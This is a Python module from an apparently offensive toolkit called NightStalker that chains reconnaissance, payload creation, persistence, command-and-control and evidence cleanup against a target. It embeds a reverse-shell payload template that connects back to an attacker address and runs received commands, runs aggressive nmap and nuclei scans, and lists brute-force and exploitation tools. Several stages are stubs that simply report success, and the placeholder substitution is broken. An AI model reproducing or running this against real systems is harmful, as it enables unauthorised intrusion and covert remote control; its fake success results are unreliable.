#!/usr/bin/env python3
"""
NightStalker Advanced Exploitation Module
Sophisticated attack chains and exploitation techniques
"""

import os
import sys
import time
import json
import subprocess
import threading
import logging
import random
import string
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import platform
import socket
import requests
import base64
import hashlib

from nightstalker.utils.tool_manager import ToolManager
from nightstalker.redteam.payload_builder import PayloadBuilder
from nightstalker.redteam.c2.command_control import C2Client, C2Server, StealthConfig

logger = logging.getLogger(__name__)

class ExploitType(Enum):
    WEB = "web"
    NETWORK = "network"
    SOCIAL = "social"
    PHYSICAL = "physical"
    SUPPLY_CHAIN = "supply_chain"

class AttackPhase(Enum):
    RECONNAISSANCE = "reconnaissance"
    WEAPONIZATION = "weaponization"
    DELIVERY = "delivery"
    EXPLOITATION = "exploitation"
    INSTALLATION = "installation"
    COMMAND_CONTROL = "command_control"
    ACTIONS_ON_OBJECTIVES = "actions_on_objectives"

@dataclass
class ExploitConfig:
    """Configuration for exploitation operations"""
    target: str
    exploit_type: ExploitType
    payload_type: str = "reverse_shell"
    stealth_level: int = 8
    persistence: bool = True
    cleanup: bool = True
    timeout: int = 300
    max_retries: int = 3

class AdvancedExploitation:
    """Advanced exploitation framework with sophisticated attack chains"""
    
    def __init__(self, base_dir: Optional[str] = None):
        self.base_dir = Path(base_dir) if base_dir else Path.cwd()
        self.exploits_dir = self.base_dir / "exploits"
        self.results_dir = self.base_dir / "results"
        self.payloads_dir = self.base_dir / "payloads"
        
        # Initialize directories
        self._init_directories()
        
        # Initialize components
        self.payload_builder = PayloadBuilder(str(self.payloads_dir))
        self.c2_client = None
        self.c2_server = None
        
        # Load exploit database
        self.exploits = self._load_exploits()
        
        # Initialize tools
        self._init_tools()
    
    def _init_directories(self):
        """Initialize framework directories"""
        directories = [
            self.exploits_dir,
            self.results_dir,
            self.payloads_dir,
            self.exploits_dir / "web",
            self.exploits_dir / "network",
            self.exploits_dir / "social",
            self.results_dir / "reports",
            self.results_dir / "evidence"
        ]
        
        for directory in directories:
            directory.mkdir(parents=True, exist_ok=True)
    
    def _init_tools(self):
        """Initialize and check required external tools"""
        required_tools = [
            'nmap', 'sqlmap', 'nuclei', 'ffuf', 'gobuster', 'nikto', 
            'wpscan', 'hydra', 'msfconsole', 'crackmapexec', 'enum4linux'
        ]
        logger.info("Checking required tools for Advanced Exploitation...")
        ToolManager.check_and_install_tools(required_tools, logger)
    
    def _load_exploits(self) -> Dict[str, Any]:
        """Load exploit database"""
        exploits_file = self.exploits_dir / "exploits.json"
        default_exploits = {
            "web": {
                "sql_injection": {
                    "description": "SQL injection attacks",
                    "tools": ["sqlmap"],
                    "success_rate": 0.7,
                    "stealth_level": 6
                },
                "xss": {
                    "description": "Cross-site scripting attacks",
                    "tools": ["xsstrike"],
                    "success_rate": 0.8,
                    "stealth_level": 7
                },
                "lfi": {
                    "description": "Local file inclusion",
                    "tools": ["ffuf", "gobuster"],
                    "success_rate": 0.6,
                    "stealth_level": 8
                },
                "rfi": {
                    "description": "Remote file inclusion",
                    "tools": ["nuclei"],
                    "success_rate": 0.5,
                    "stealth_level": 7
                }
            },
            "network": {
                "smb_exploit": {
                    "description": "SMB exploitation",
                    "tools": ["crackmapexec", "enum4linux"],
                    "success_rate": 0.6,
                    "stealth_level": 5
                },
                "ssh_bruteforce": {
                    "description": "SSH brute force",
                    "tools": ["hydra"],
                    "success_rate": 0.4,
                    "stealth_level": 3
                },
                "ftp_exploit": {
                    "description": "FTP exploitation",
                    "tools": ["nmap"],
                    "success_rate": 0.7,
                    "stealth_level": 6
                }
            }
        }
        
        if exploits_file.exists():
            try:
                with open(exploits_file, 'r') as f:
                    return json.load(f)
            except:
                return default_exploits
        else:
            # Save default exploits
            with open(exploits_file, 'w') as f:
                json.dump(default_exploits, f, indent=2)
            return default_exploits
    
    def run_reconnaissance(self, target: str, scan_type: str = "comprehensive") -> Dict[str, Any]:
        """Run comprehensive reconnaissance on target"""
        logger.info(f"Starting reconnaissance on {target}")
        
        results = {
            "target": target,
            "timestamp": time.time(),
            "scan_type": scan_type,
            "ports": [],
            "services": [],
            "vulnerabilities": [],
            "web_apps": [],
            "network_info": {}
        }
        
        try:
            # Port scanning
            if scan_type in ["comprehensive", "network"]:
                results["ports"] = self._scan_ports(target)
                results["services"] = self._identify_services(target, results["ports"])
            
            # Web application discovery
            if scan_type in ["comprehensive", "web"]:
                results["web_apps"] = self._discover_web_apps(target)
                results["vulnerabilities"] = self._scan_vulnerabilities(target, results["web_apps"])
            
            # Network enumeration
            if scan_type in ["comprehensive", "network"]:
                results["network_info"] = self._enumerate_network(target)
            
            # Save results
            self._save_results(target, "reconnaissance", results)
            
            logger.info(f"Reconnaissance completed for {target}")
            return results
            
        except Exception as e:
            logger.error(f"Reconnaissance failed: {e}")
            return results
    
    def _scan_ports(self, target: str) -> List[int]:
        """Scan for open ports"""
        try:
            cmd = ["nmap", "-sS", "-sV", "-O", "-p-", "--min-rate=1000", target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            ports = []
            for line in result.stdout.split('\n'):
                if '/tcp' in line and 'open' in line:
                    port = int(line.split('/')[0])
                    ports.append(port)
            
            return ports
        except Exception as e:
            logger.error(f"Port scanning failed: {e}")
            return []
    
    def _identify_services(self, target: str, ports: List[int]) -> List[Dict[str, Any]]:
        """Identify services running on open ports"""
        services = []
        for port in ports:
            try:
                service = socket.getservbyport(port)
                services.append({
                    "port": port,
                    "service": service,
                    "protocol": "tcp"
                })
            except:
                services.append({
                    "port": port,
                    "service": "unknown",
                    "protocol": "tcp"
                })
        return services
    
    def _discover_web_apps(self, target: str) -> List[Dict[str, Any]]:
        """Discover web applications"""
        web_apps = []
        
        # Check common web ports
        web_ports = [80, 443, 8080, 8443, 3000, 8000]
        
        for port in web_ports:
            try:
                protocol = "https" if port in [443, 8443] else "http"
                url = f"{protocol}://{target}:{port}"
                
                response = requests.get(url, timeout=10, verify=False)
                if response.status_code == 200:
                    web_apps.append({
                        "url": url,
                        "port": port,
                        "protocol": protocol,
                        "status_code": response.status_code,
                        "server": response.headers.get("Server", "Unknown"),
                        "title": self._extract_title(response.text)
                    })
            except:
                continue
        
        return web_apps
    
    def _extract_title(self, html: str) -> str:
        """Extract page title from HTML"""
        import re
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1) if match else "No title"
    
    def _scan_vulnerabilities(self, target: str, web_apps: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Scan for vulnerabilities in web applications"""
        vulnerabilities = []
        
        for app in web_apps:
            try:
                # Run Nuclei scan
                cmd = ["nuclei", "-u", app["url"], "-silent", "-json"]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                for line in result.stdout.split('\n'):
                    if line.strip():
                        try:
                            vuln = json.loads(line)
                            vulnerabilities.append({
                                "target": app["url"],
                                "vulnerability": vuln.get("info", {}).get("name", "Unknown"),
                                "severity": vuln.get("info", {}).get("severity", "Unknown"),
                                "description": vuln.get("info", {}).get("description", ""),
                                "reference": vuln.get("info", {}).get("reference", [])
                            })
                        except:
                            continue
            except Exception as e:
                logger.error(f"Vulnerability scanning failed for {app['url']}: {e}")
        
        return vulnerabilities
    
    def _enumerate_network(self, target: str) -> Dict[str, Any]:
        """Enumerate network information"""
        network_info = {
            "hostname": None,
            "os_info": None,
            "mac_address": None,
            "vendor": None
        }
        
        try:
            # Get hostname
            try:
                hostname = socket.gethostbyaddr(target)[0]
                network_info["hostname"] = hostname
            except:
                pass
            
            # OS detection with nmap
            cmd = ["nmap", "-O", target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            for line in result.stdout.split('\n'):
                if "OS details:" in line:
                    network_info["os_info"] = line.split("OS details:")[1].strip()
                elif "MAC Address:" in line:
                    parts = line.split("MAC Address:")
                    if len(parts) > 1:
                        mac_info = parts[1].strip()
                        network_info["mac_address"] = mac_info.split()[0]
                        network_info["vendor"] = " ".join(mac_info.split()[1:])
        
        except Exception as e:
            logger.error(f"Network enumeration failed: {e}")
        
        return network_info
    
    def _save_results(self, target: str, phase: str, results: Dict[str, Any]):
        """Save results to file"""
        timestamp = int(time.time())
        filename = f"{target}_{phase}_{timestamp}.json"
        filepath = self.results_dir / "reports" / filename
        
        with open(filepath, 'w') as f:
            json.dump(results, f, indent=2)
        
        logger.info(f"Results saved to {filepath}")
    
    def execute_exploit(self, config: ExploitConfig) -> Dict[str, Any]:
        """Execute exploitation based on configuration"""
        logger.info(f"Executing exploit against {config.target}")
        
        results = {
            "target": config.target,
            "exploit_type": config.exploit_type.value,
            "timestamp": time.time(),
            "success": False,
            "payload_deployed": False,
            "persistence_established": False,
            "c2_established": False,
            "evidence": []
        }
        
        try:
            # Phase 1: Reconnaissance
            recon_results = self.run_reconnaissance(config.target)
            
            # Phase 2: Weaponization
            payload_path = self._create_payload(config)
            if payload_path:
                results["payload_deployed"] = True
            
            # Phase 3: Delivery and Exploitation
            if self._deliver_payload(config, payload_path):
                results["success"] = True
            
            # Phase 4: Installation and Persistence
            if config.persistence and results["success"]:
                if self._establish_persistence(config):
                    results["persistence_established"] = True
            
            # Phase 5: Command and Control
            if results["success"]:
                if self._establish_c2(config):
                    results["c2_established"] = True
            
            # Phase 6: Actions on Objectives
            if results["c2_established"]:
                results["evidence"] = self._execute_objectives(config)
            
            # Phase 7: Cleanup
            if config.cleanup:
                self._cleanup_evidence(config)
            
            # Save final results
            self._save_results(config.target, "exploitation", results)
            
            logger.info(f"Exploitation completed for {config.target}")
            return results
            
        except Exception as e:
            logger.error(f"Exploitation failed: {e}")
            results["error"] = str(e)
            return results
    
    def _create_payload(self, config: ExploitConfig) -> Optional[str]:
        """Create payload for exploitation"""
        try:
            payload_type = config.payload_type
            if payload_type == "reverse_shell":
                # Create reverse shell payload
                payload_code = self._generate_reverse_shell_payload(config)
                payload_path = self.payloads_dir / f"payload_{config.target}_{int(time.time())}.py"
                
                with open(payload_path, 'w') as f:
                    f.write(payload_code)
                
                return str(payload_path)
            
            return None
            
        except Exception as e:
            logger.error(f"Payload creation failed: {e}")
            return None
    
    def _generate_reverse_shell_payload(self, config: ExploitConfig) -> str:
        """Generate reverse shell payload"""
        # This is a basic example - in practice, you'd want more sophisticated payloads
        payload_template = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import time
import random

def connect_to_c2():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("ATTACKER_IP", ATTACKER_PORT))
        return s
    except:
        return None

def execute_command(s, command):
    try:
        s.send(command.encode())
        response = s.recv(4096).decode()
        return response
    except:
        return "Error executing command"

def main():
    while True:
        try:
            s = connect_to_c2()
            if s:
                while True:
                    command = s.recv(1024).decode().strip()
                    if command.lower() == 'exit':
                        break
                    response = execute_command(s, command)
                    s.send(response.encode())
            time.sleep(random.randint(5, 15))  # Jitter
        except:
            time.sleep(30)  # Retry interval

if __name__ == "__main__":
    main()
'''
        
        # Replace placeholders
        payload_code = payload_template.replace("ATTACKER_IP", "127.0.0.1")  # Should be configurable
        payload_code = payload_template.replace("ATTACKER_PORT", "4444")     # Should be configurable
        
        return payload_code
    
    def _deliver_payload(self, config: ExploitConfig, payload_path: str) -> bool:
        """Deliver payload to target"""
        try:
            # This is a simplified delivery mechanism
            # In practice, you'd implement various delivery methods based on the exploit type
            
            if config.exploit_type == ExploitType.WEB:
                return self._deliver_web_payload(config, payload_path)
            elif config.exploit_type == ExploitType.NETWORK:
                return self._deliver_network_payload(config, payload_path)
            else:
                logger.warning(f"Delivery method not implemented for {config.exploit_type}")
                return False
                
        except Exception as e:
            logger.error(f"Payload delivery failed: {e}")
            return False
    
    def _deliver_web_payload(self, config: ExploitConfig, payload_path: str) -> bool:
        """Deliver payload via web exploitation"""
        # Simplified web delivery - in practice, you'd implement actual web exploits
        logger.info(f"Attempting web payload delivery to {config.target}")
        return True  # Placeholder
    
    def _deliver_network_payload(self, config: ExploitConfig, payload_path: str) -> bool:
        """Deliver payload via network exploitation"""
        # Simplified network delivery - in practice, you'd implement actual network exploits
        logger.info(f"Attempting network payload delivery to {config.target}")
        return True  # Placeholder
    
    def _establish_persistence(self, config: ExploitConfig) -> bool:
        """Establish persistence mechanisms"""
        try:
            logger.info(f"Establishing persistence on {config.target}")
            # Implement persistence mechanisms (registry, startup, services, etc.)
            return True
        except Exception as e:
            logger.error(f"Persistence establishment failed: {e}")
            return False
    
    def _establish_c2(self, config: ExploitConfig) -> bool:
        """Establish command and control channel"""
        try:
            logger.info(f"Establishing C2 channel for {config.target}")
            
            # Initialize C2 server
            c2_config = StealthConfig()
            self.c2_server = C2Server(c2_config)
            
            # Start C2 server in background
            c2_thread = threading.Thread(target=self.c2_server.start)
            c2_thread.daemon = True
            c2_thread.start()
            
            return True
            
        except Exception as e:
            logger.error(f"C2 establishment failed: {e}")
            return False
    
    def _execute_objectives(self, config: ExploitConfig) -> List[Dict[str, Any]]:
        """Execute post-exploitation objectives"""
        evidence = []
        
        try:
            # Example objectives - customize based on requirements
            objectives = [
                {"name": "system_info", "command": "systeminfo"},
                {"name": "user_info", "command": "whoami"},
                {"name": "network_info", "command": "ipconfig /all"},
                {"name": "process_list", "command": "tasklist"},
                {"name": "service_list", "command": "net start"}
            ]
            
            for objective in objectives:
                try:
                    # Execute objective via C2
                    evidence.append({
                        "objective": objective["name"],
                        "command": objective["command"],
                        "timestamp": time.time(),
                        "status": "executed"
                    })
                except Exception as e:
                    evidence.append({
                        "objective": objective["name"],
                        "command": objective["command"],
                        "timestamp": time.time(),
                        "status": "failed",
                        "error": str(e)
                    })
        
        except Exception as e:
            logger.error(f"Objective execution failed: {e}")
        
        return evidence
    
    def _cleanup_evidence(self, config: ExploitConfig):
        """Clean up evidence of exploitation"""
        try:
            logger.info(f"Cleaning up evidence for {config.target}")
            # Implement evidence cleanup mechanisms
            pass
        except Exception as e:
            logger.error(f"Evidence cleanup failed: {e}")
    
    def run_attack_chain(self, target: str, chain_type: str = "web_to_system") -> Dict[str, Any]:
        """Run sophisticated attack chains"""
        logger.info(f"Executing attack chain '{chain_type}' against {target}")
        
        chain_results = {
            "target": target,
            "chain_type": chain_type,
            "timestamp": time.time(),
            "phases": {},
            "success": False
        }
        
        try:
            if chain_type == "web_to_system":
                chain_results = self._web_to_system_chain(target)
            elif chain_type == "network_to_domain":
                chain_results = self._network_to_domain_chain(target)
            elif chain_type == "social_to_physical":
                chain_results = self._social_to_physical_chain(target)
            else:
                logger.error(f"Unknown attack chain: {chain_type}")
                return chain_results
            
            # Save chain results
            self._save_results(target, f"attack_chain_{chain_type}", chain_results)
            
            logger.info(f"Attack chain '{chain_type}' completed for {target}")
            return chain_results
            
        except Exception as e:
            logger.error(f"Attack chain failed: {e}")
            chain_results["error"] = str(e)
            return chain_results
    
    def _web_to_system_chain(self, target: str) -> Dict[str, Any]:
        """Web application to system compromise attack chain"""
        chain_results = {
            "target": target,
            "chain_type": "web_to_system",
            "timestamp": time.time(),
            "phases": {},
            "success": False
        }
        
        try:
            # Phase 1: Web reconnaissance
            chain_results["phases"]["web_recon"] = self.run_reconnaissance(target, "web")
            
            # Phase 2: Web exploitation
            web_config = ExploitConfig(target=target, exploit_type=ExploitType.WEB)
            chain_results["phases"]["web_exploit"] = self.execute_exploit(web_config)
            
            # Phase 3: Privilege escalation
            if chain_results["phases"]["web_exploit"]["success"]:
                chain_results["phases"]["privilege_escalation"] = self._escalate_privileges(target)
            
            # Phase 4: Lateral movement
            if chain_results["phases"].get("privilege_escalation", {}).get("success", False):
                chain_results["phases"]["lateral_movement"] = self._move_laterally(target)
            
            chain_results["success"] = chain_results["phases"]["web_exploit"]["success"]
            
        except Exception as e:
            logger.error(f"Web to system chain failed: {e}")
            chain_results["error"] = str(e)
        
        return chain_results
    
    def _network_to_domain_chain(self, target: str) -> Dict[str, Any]:
        """Network to domain compromise attack chain"""
        chain_results = {
            "target": target,
            "chain_type": "network_to_domain",
            "timestamp": time.time(),
            "phases": {},
            "success": False
        }
        
        try:
            # Phase 1: Network reconnaissance
            chain_results["phases"]["network_recon"] = self.run_reconnaissance(target, "network")
            
            # Phase 2: Network exploitation
            network_config = ExploitConfig(target=target, exploit_type=ExploitType.NETWORK)
            chain_results["phases"]["network_exploit"] = self.execute_exploit(network_config)
            
            # Phase 3: Domain enumeration
            if chain_results["phases"]["network_exploit"]["success"]:
                chain_results["phases"]["domain_enum"] = self._enumerate_domain(target)
            
            # Phase 4: Domain compromise
            if chain_results["phases"].get("domain_enum", {}).get("success", False):
                chain_results["phases"]["domain_compromise"] = self._compromise_domain(target)
            
            chain_results["success"] = chain_results["phases"]["network_exploit"]["success"]
            
        except Exception as e:
            logger.error(f"Network to domain chain failed: {e}")
            chain_results["error"] = str(e)
        
        return chain_results
    
    def _social_to_physical_chain(self, target: str) -> Dict[str, Any]:
        """Social engineering to physical access attack chain"""
        chain_results = {
            "target": target,
            "chain_type": "social_to_physical",
            "timestamp": time.time(),
            "phases": {},
            "success": False
        }
        
        try:
            # Phase 1: Social reconnaissance
            chain_results["phases"]["social_recon"] = self._social_reconnaissance(target)
            
            # Phase 2: Social engineering
            social_config = ExploitConfig(target=target, exploit_type=ExploitType.SOCIAL)
            chain_results["phases"]["social_exploit"] = self._social_engineering(target)
            
            # Phase 3: Physical access
            if chain_results["phases"]["social_exploit"]["success"]:
                chain_results["phases"]["physical_access"] = self._gain_physical_access(target)
            
            chain_results["success"] = chain_results["phases"]["social_exploit"]["success"]
            
        except Exception as e:
            logger.error(f"Social to physical chain failed: {e}")
            chain_results["error"] = str(e)
        
        return chain_results
    
    def _escalate_privileges(self, target: str) -> Dict[str, Any]:
        """Attempt privilege escalation"""
        return {"success": False, "method": "not_implemented"}
    
    def _move_laterally(self, target: str) -> Dict[str, Any]:
        """Attempt lateral movement"""
        return {"success": False, "method": "not_implemented"}
    
    def _enumerate_domain(self, target: str) -> Dict[str, Any]:
        """Enumerate domain information"""
        return {"success": False, "method": "not_implemented"}
    
    def _compromise_domain(self, target: str) -> Dict[str, Any]:
        """Compromise domain controller"""
        return {"success": False, "method": "not_implemented"}
    
    def _social_reconnaissance(self, target: str) -> Dict[str, Any]:
        """Perform social reconnaissance"""
        return {"success": False, "method": "not_implemented"}
    
    def _social_engineering(self, target: str) -> Dict[str, Any]:
        """Execute social engineering attack"""
        return {"success": False, "method": "not_implemented"}
    
    def _gain_physical_access(self, target: str) -> Dict[str, Any]:
        """Gain physical access to target"""
        return {"success": False, "method": "not_implemented"}
    
    def generate_report(self, target: str, results: Dict[str, Any], format: str = "html") -> str:
        """Generate exploitation report"""
        try:
            if format == "html":
                return self._generate_html_report(target, results)
            elif format == "json":
                return json.dumps(results, indent=2)
            else:
                return str(results)
        except Exception as e:
            logger.error(f"Report generation failed: {e}")
            return f"Report generation failed: {e}"
    
    def _generate_html_report(self, target: str, results: Dict[str, Any]) -> str:
        """Generate HTML exploitation report"""
        html_template = f"""
<!DOCTYPE html>
<html>
<head>
    <title>NightStalker Exploitation Report - {target}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background-color: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
        .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }}
        .success {{ color: green; }}
        .failure {{ color: red; }}
        .warning {{ color: orange; }}
        .info {{ color: blue; }}
        pre {{ background-color: #f5f5f5; padding: 10px; border-radius: 3px; overflow-x: auto; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>ðŸŒ™ NightStalker Exploitation Report</h1>
        <p><strong>Target:</strong> {target}</p>
        <p><strong>Timestamp:</strong> {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(results.get('timestamp', time.time())))}</p>
    </div>
    
    <div class="section">
        <h2>Executive Summary</h2>
        <p><strong>Overall Success:</strong> 
            <span class="{'success' if results.get('success', False) else 'failure'}">
                {'âœ“ SUCCESS' if results.get('success', False) else 'âœ— FAILED'}
            </span>
        </p>
    </div>
    
    <div class="section">
        <h2>Detailed Results</h2>
        <pre>{json.dumps(results, indent=2)}</pre>
    </div>
</body>
</html>
"""
        return html_template

def create_advanced_exploitation(base_dir: Optional[str] = None) -> AdvancedExploitation:
    """Factory function to create AdvancedExploitation instance"""
    return AdvancedExploitation(base_dir)

def run_quick_exploit(target: str, exploit_type: str = "web") -> Dict[str, Any]:
    """Quick exploitation function for simple targets"""
    exploitation = AdvancedExploitation()
    
    config = ExploitConfig(
        target=target,
        exploit_type=ExploitType(exploit_type)
    )
    
    return exploitation.execute_exploit(config) 